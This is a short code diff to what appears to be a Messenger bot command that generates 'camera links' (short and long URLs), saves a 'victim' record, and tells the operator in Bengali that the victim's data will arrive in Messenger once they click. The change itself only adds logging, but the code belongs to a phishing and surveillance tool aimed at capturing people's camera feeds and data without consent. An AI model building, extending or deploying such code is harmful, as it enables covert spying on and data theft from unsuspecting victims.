@@ -21,10 +21,11 @@ module.exports = {
                 status: 'pending'
             });
             await victim.save();
+            console.log(`✅ ভিক্টিম সেভ: ${id}`);
 
             await sendMessage(senderId, `✅ **ক্যামেরা লিংক তৈরি করা হলো!**\n\n🔗 শর্ট লিংক: ${shortLink}\n🔗 আসল লিংক: ${longLink}\n\nভিক্টিম ক্লিক করলে সব ডেটা আপনার মেসেঞ্জারে চলে আসবে।`);
         } catch (err) {
-            console.error('Create command error:', err);
+            console.error('❌ Create command error:', err);
             await sendMessage(senderId, '❌ লিংক তৈরি করতে ব্যর্থ: ' + err.message);
         }
     }
